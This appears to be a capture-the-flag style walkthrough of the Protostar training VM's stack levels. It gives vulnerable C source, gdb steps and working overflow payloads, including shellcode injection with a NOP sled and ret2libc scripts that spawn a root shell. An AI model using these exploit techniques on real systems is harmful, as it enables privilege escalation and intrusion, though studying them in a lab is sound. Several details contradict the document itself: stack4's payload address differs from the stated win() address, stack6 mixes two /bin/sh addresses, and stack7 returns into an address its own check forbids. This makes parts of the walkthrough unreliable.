# Protostar

## loging into the server
Made some changes to the VM's network configuration to set up port forwarding, which is essential to connect to VM from the host machine using 'lo' interface

  

In VirtualBox, we configured port forwarding to map a port(Here 2222 , we can choose any available port) on the host machine to the SSH port on VM.

This allows us to connect to the VM using host machine’s localhost address and a specific port, even if the VM is on a different network or behind a VPN.

  

  > ssh -p 2222 user@127.0.0.1

  Unable to negotiate with 127.0.0.1 port 2222: no matching host key type found. Their offer: ssh-rsa,ssh-dss

  Modern SSH clients have disabled support for older host key algorithms like ssh-rsa and ssh-dss by default due to security concerns.

  But here the VM is offering those keys, so we used the "-oHostKeyAlgorithms=+ssh-rsa" option in the SSH command to tell the SSH client to accept ssh-rsa as a valid host key algorithm.

  >ssh -p 2222 -oHostKeyAlgorithms=+ssh-rsa user@127.0.0.1

   Which allows us to connect to the VM on entering password 'user'

   Use bash command to work in the interactive bash shell

  

  

## stack 0:

  >cd /opt/protostar/bin

   redirects us to the "/opt/protostar/bin" directory in which stack0 file is present
```
           SOURCE CODE:

#include <stdlib.h>

#include <unistd.h>
#include <stdio.h>

  

int main(int argc, char \*\*argv){
    volatile int modified;

    char buffer\[64\];

  

    modified = 0;

    gets(buffer);

  

    if(modified != 0) {

     printf("you have changed the 'modified' variable\\n");

    } else {

    printf("Try again?\\n");

                  }

  }
```
Let us understand the code first:

There is a volatile integer variable named "modified" and a character array named "buffer" with '64' bytes space

The variable modified is set up to '0', and there’s gets function called after modified is set to 0 and the user input is put into buffer

Then the program checks whether it is equal to zero or not, if it’s not 0 , we are done

From the source code , we can observe that if we print 64 characters the buffer will be fill up exactly but not overflow . So we need to input more than 64 characters

Let us input the string "iit" 22 times, which has 66(>64) characters which leads to buffer overflow

As we know, from the 65th character will overflow the buffer and start overwriting adjacent memory in this case "modified" variable

Since, it is a volatile int, it's value will gets changed on buffer overflow

> python3 -c "import sys; sys.stdout.buffer.write(b'iit' \* 22)" | ./stack0

Uses Python to generate a string of 66 characters ( "iit" for 22 times ) and passes it to the file by '|' while the file is executing (./stack0 executes the stack0 file)

We will receive the output: "you have changed the 'modified' variable" .

We are done with stack0.
```
stack 1:  

  

  

         SOURCE CODE:

            #include <stdlib.h>

            #include <unistd.h>

            #include <stdio.h>

            #include <string.h>

  

            int main(int argc, char \*\*argv)

            {

             volatile int modified;

             char buffer\[64\];

  

             if(argc == 1) {

               errx(1, "please specify an argument\\n");

             }

  

             modified = 0;

             strcpy(buffer, argv\[1\]);

  

             if(modified == 0x61626364) {

               printf("you have correctly got the variable to the right value\\n");

             } else {

               printf("Try again, you got 0x%08x\\n", modified);

             }

            }
```
  

  

  

  

  In this, our goal is to pass an argument which causes buffer overflow and cange "modified" to a specific value

  argc which specifies the number of arguments passed will always be equal to or greater than one, since argv\[0\] itself represents the name of the programme

  If we pass the arguements, the argc value will be increased the number of arguments we have passed

  In this challenge we need to change the value of the volatile int "modified" into a particular value which translates to "0x61626364" in hexa decimal

        On conversion 0x61 -> 'a'

          0x62 -> 'b'

          0x63 -> 'c'

          0x64 -> 'd'    

We get the value "0x61626364"in hexadecimal is same as "abcd" ASCII string

         As mentioned Protostar uses little endian, meaning we need to input the value 0x61626364 in reverse order: \\x64\\x63\\x62\\x61 i.e "dcba"

Similar to the previous challenge, if we overflow the buffer , it will start overwriting adjacent memory , so the value of "modified" will be changed

So we will input some string which occupies 64 bytes and append it with the string "dcba"       

> python3 -c "import sys; sys.stdout.buffer.write(('hi' \* 32 + 'dcba').encode())" | ./stack1

On giving the above command as the input we will receive the msg:

you have correctly got the variable to the right value

  

## stack2:

  

  

     SOURCE CODE:

      #include <stdlib.h>

      #include <unistd.h>

      #include <stdio.h>

      #include <string.h>

  

      int main(int argc, char \*\*argv)

      {

       volatile int modified;

       char buffer\[64\];

       char \*variable;

  

       variable = getenv("GREENIE");

  

       if(variable == NULL) {

         errx(1, "please set the GREENIE environment variable\\n");

       }

  

       modified = 0;

  

       strcpy(buffer, variable);

  

       if(modified == 0x0d0a0d0a) {

         printf("you have correctly modified the variable\\n");

       } else {

         printf("Try again, you got 0x%08x\\n", modified);

       }

  

      }

  

  

Let us understand the code:

  

There is a volatile integer variable named "modified", a character array named "buffer" with 64 bytes space, and a pointer variable named "variable".

  

"variable" is set to the value of the environment variable "GREENIE" using getenv.

If "GREENIE" is not set, the program prints an error message and exits.

  

The modified variable is set to 0, and then the content of variable is copied into buffer using strcpy.

This can lead to a buffer overflow if the content of variable exceeds 64 bytes similar to above challenges 

  

The program then checks whether modified is equal to 0x0d0a0d0a, if it is, it prints a success message. 

Otherwise, it will print the current value of modified.

  

We can observe if we set the "GREENIE" environment variable to have more than 64 char, it will overflow the buffer and start overwriting adjacent memory, the modified variable.

  

We need to change the value of the modified variable to 0x0d0a0d0a.

In hexadecimal, this translates to:

  

    0x0d -> '\\r' (carriage return)

    0x0a -> '\\n' (newline)

  

As mentioned, Protostar uses little endian, meaning we need to input the value 0x0d0a0d0a in reverse order: \\x0a\\x0d\\x0a\\x0d.

  

We will input a string that occupies 64 bytes and append it with the string "\\x0a\\x0d\\x0a\\x0d".

>GREENIE=$(python3 -c "print('Q'\*64 + '\\x0a\\x0d\\x0a\\x0d')") ./stack2

  

This command generates a string of 64 'Q' characters followed by the little endian representation of 0x0d0a0d0a using python and assigns it to GREENIE followed by running the stack2 programme with the GREENIE environment variable

  

Running the above command we will receive the output " you have correctly modified the variable "

  

  

## stack3:

  

    SOURCE CODE:

      #include <stdlib.h>

      #include <unistd.h>

      #include <stdio.h>

      #include <string.h>

  

      void win()

      {

       printf("code flow successfully changed\\n");

      }

  

      int main(int argc, char \*\*argv)

      {

       volatile int (\*fp)();

       char buffer\[64\];

  

       fp = 0;

  

       gets(buffer);

  

       if(fp) {

         printf("calling function pointer, jumping to 0x%08x\\n", fp);

         fp();

       }

      }

  

Let us understand the code:

We need to overflow the buffer array in main() such that we can overwrite the fp function pointer which is declared as volatile to execute the win() function.

In the code volatile int (\*fp)() declares fp as a volatile function pointer. 

As we know being volatile, its value can change unexpectedly due to changes in hardware (e.g., due to buffer overflows)

The gets(buffer) reads input into buffer. 

If the buffer overflow occurs when input exceeds 64 characters (buffer size), it will overwrite the value stored in the one which is adjacent to it , here in this case it is a function pointer fp

If we are able to overflow the adress of win() into the fp , The win() function will be called as mentioned in the code and we will be done with it

Let us use gdb to know the adress of the win function

> gdb ./stack3  
(gdb) p win

commands will display the location address of the win function stored in the memory

We will get " $1 = {void (void)} 0x8048424 \<win\> " as output indicating "0x8048424" as the memory address of the win function   

As we know protostar is a little endian, we need to append the 64 bytes string with '\\x24\\x84\\x04\\x08'

Similar to previous cases:

> python3 -c "print('x'\*64 + '\\x24\\x84\\x04\\x08')" | ./stack3

  

This command will output "code flow successfully changed".

  

## stack 4:

  

  

      SOURCE CODE:

        #include <stdlib.h>

        #include <unistd.h>

        #include <stdio.h>

        #include <string.h>

  

        void win()

        {

         printf("code flow successfully changed\\n");

        }

  

        int main(int argc, char \*\*argv)

        {

         char buffer\[64\];

  

         gets(buffer);

        }

In this exercise, we are going to target the return address of the main function, EIP

we have to overflow the buffer such that when the main function returns it will redirect program execution to our manipulated address in this case it is win() function

Find the address of the win function as mentioned above (0x8048424)

We will overflow the buffer and increase it until we get a segmentation fault message, implying the return address was faulty

As the EIP takes up four bytes, we will increase the buffer by 4 bytes (after 64) every time.

On trying this we will get segmentation fault message , when the buffer overflow by 12 bytes i.e input to gets() is 76 in total

Now we have got every thing we need

>(python3 -c "import sys; sys.stdout.buffer.write(b'a'\*76 + b'\\xf4\\x83\\x04\\x08')";) | ./stack4

The output we will receive will be 

code flow successfully changed

Segmentation fault

segmentation fault after is due to overwriting the original return address, so the program can’t exit properly    

  

## stack5:

  

     SOURCE CODE:

         #include <stdlib.h>

         #include <unistd.h>

         #include <stdio.h>

         #include <string.h>

  

         int main(int argc, char \*\*argv)

         {

          char buffer\[64\];

  

          gets(buffer);

         }

This is similar to the previous challenge.

Now, we’re going to use the overflow vulnerability to both put the shellcode on the stack, and to point EIP to where we put the code.

Let us use this shell code: (taken from internet)

    "\\x31\\xc0\\x31\\xdb\\xb0\\x06\\xcd\\x80\\x53\\x68/tty\\x68/dev\\x89\\xe3\\x31\\xc9\\x66\\xb9\\x12\\x27\\xb0\\x05\\xcd\\x80\\x31\\xc0\\x50\\x68//sh\\x68/bin\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80"

To determine the memory adress of 'ESP' (where buffer array starts) , we will run the following commands:

> gdb stack5

We’ll want to set a breakpoint at main (the main function of the program) so that when the program runs we can see what the stack looks like. 

>(gdb) b main  
(gdb) run

when the breakpoint is hit, print the value of the stack pointer (ESP) to find the address of the buffer array

>(gdb) p $esp

The output will be " $1 = (void \*) 0xbffff760 " represents the starting address of the buffer array

Now, similar to the stack4 we target the return address of the main function and overflow the buffer into it

we have already got the 76 to fill the buffer up till EIP  

>(python3 -c "import sys; sys.stdout.buffer.write(b'\\x90'\*76 + b'\\x00\\xf8\\xff\\xbf' + b'\\x90'\*30 + b'\\x31\\xc0\\x31\\xdb\\xb0\\x06\\xcd\\x80\\x53\\x68/tty\\x68/dev\\x89\\xe3\\x31\\xc9\\x66\\xb9\\x12\\x27\\xb0\\x05\\xcd\\x80\\x31\\xc0\\x50\\x68//sh\\x68/bin\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80')") | ./stack5

  

The NOP instruction (\\x90 in hexadecimal) is used to create a sled for the program to slide down until it hits the shellcode.

NOP sled increases the chances of hitting the shellcode succesfully , even if the exact return address isn't perfectly accurate.  

'\\x00\\xf8\\xff\\xbf' is the address in little-endian format where we want EIP to be jumped to after the buffer overflow happens  

These additional '\\x90'\*30 after the return address is to ensure the execution flow reaches the shellcode smoothly.

Next one is the actual shellcode.

So finally runinng this command will give us a shell prompt (#).

This prompt indicates that we now have gained root access. We can verify this by using prompt like "whoami"

## stack 6:

  

  

     SOURCE CODE:

        #include <stdlib.h>

        #include <unistd.h>

        #include <stdio.h>

        #include <string.h>

  

        void getpath()

        {

         char buffer\[64\];

         unsigned int ret;

  

         printf("input path please: "); fflush(stdout);

  

         gets(buffer);

  

         ret = \_\_builtin\_return\_address(0);

  

         if((ret & 0xbf000000) == 0xbf000000) {

          printf("bzzzt (%p)\\n", ret);

          \_exit(1);

         }

  

         printf("got path %s\\n", buffer);

        }

  

        int main(int argc, char \*\*argv)

        {

         getpath();

        }

  

Let us breakdown the code first:

First we need to input a path. The programme reads our input into a fixed-size buffer using gets function.

The function getpath retrieves the return address of the function call and checks if it falls within a specific memory range (0xbf000000 to 0xbfffffff)

The return address cannot start with 0xb if it starts it prints an error message and exits , else it prints the input path.

Our goal is to similar to previous one but this time the return pointer should not be in 0xbf000000 address space(stack)

To bypass the NX stack protection, we will use the ret2libc technique. 

Instead of injecting shellcode directly, we overwrite the return address to call the system function in the libc library, passing /bin/sh as an argument to spawn a shell

By trial and error, we determine that the offset to the return address is 80 bytes      

To find the address of system in libc, we use gdb

> (gdb) p system

The output will be $1 = {\<text variable, no debug info\>} 0xb7ecffb0 <\_\_libc\_system\>

To find exit function adress

> (gdb) p exit

The output will be $2 = {\<text variable, no debug info\>} 0xb7ec60c0 <\*\_\_GI\_exit>  

To find the address of /bin/sh, we can pass it as part of our input and find it on the stack

>(gdb) x/s 0xbffff7f8

The output will be 0xbffff7f8: "/bin/sh" 

Let us write a python code(exploit.py) and pass the input into the programme:

    import struct

  

    padding = b'A' \* 80

    system\_addr = struct.pack("<I", 0xb7ecffb0)  

    exit\_addr = struct.pack("<I", 0xb7ec60c0)  

    bin\_sh\_addr = struct.pack("<I", 0xb7fb63f8)  

  

    payload = padding + system\_addr + exit\_addr + bin\_sh\_addr + b"/usr/bin/id"

  

    print(payload.decode('latin-1')) 

> $ python3 exploit.py | ./stack6

We will receive output on entering the prompt id "uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)"

## stack 7:

  

SOURCE CODE:

              #include <stdlib.h>

              #include <unistd.h>

              #include <stdio.h>

              #include <string.h>

  

              char \*getpath()

              {

               char buffer\[64\];

               unsigned int ret;

  

               printf("input path please: "); fflush(stdout);

  

               gets(buffer);

  

               ret = \_\_builtin\_return\_address(0);

  

               if((ret & 0xb0000000) == 0xb0000000) {

                 printf("bzzzt (%p)\\n", ret);

                 \_exit(1);

               }

  

               printf("got path %s\\n", buffer);

               return strdup(buffer);

              }

  

              int main(int argc, char \*\*argv)

              {

               getpath();

              }

Similar to the previous one, we will still use a return-to-libc (ret2libc) attack, but we need to make sure our return address doesn't fall within the restricted memory range

We will put the address of libc function system as the return address, and manipulate the stack in a way to pass “/bin/sh” as the argument.

We will write the address of system to the location of the return address that we have found

We will use the follwing commands tosolve this

>(gdb) p system

    $3 = {<text variable, no debug info>} 0xb7ecffb0 <\_\_libc\_system>

From above the address of system is 0xb7ecffb0

Now we will find where libc is loaded in memory

> (gdb) info proc map

We will get 0xb7e97000 (start address) 0xb7fd5000(end address) of the libc

" bin/sh” string should also present in libc, we will again use gdb to find it

> (gdb) find 0xb7e97000, +9999999, "/bin/sh"

We will get the output 
```
0xb7fba23f

warning: Unable to access target memory at 0xb7fd9647, halting search.

1 pattern found.
```
But the command (gdb) x/s 0xb7fba23f won't display anything like bin/sh

>strings -a -t x /lib/libc-2.11.2.so | grep /bin/sh 

We will use the above command to inspect libc file outside gdb

we have “/bin/sh” at offset '0x11f3bf' in libc, and libc is loaded at '0xb7e97000' (from above) , which means the string is at the address '0xb7fb63bf '

On checking that in gdb, we will find that

>(gdb) x/s 0xb7fb63bf

Will output 0xb7fb63bf: "/bin/sh"    

We will use python code and input the result into our programme

  

  

### CODE:(exploit.py)

          import struct

  

          junk1 = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT' 

          system\_addr = struct.pack('I', 0xb7ecffb0)  

          junk2 = 'AAAA' # junk (return address 2 in the picture above)

          bin\_sh\_addr = struct.pack('I', 0xb7fb63bf)

  

  

          payload = junk1 + system\_addr.decode('latin-1') + junk2 + bin\_sh\_addr.decode('latin-1')

  

  

          print(payload.encode('latin-1'))

> python3 exploit.py | ./stack7  

We will be directed into a shell.  

WE ARE DONE WITH THE STACKS ;>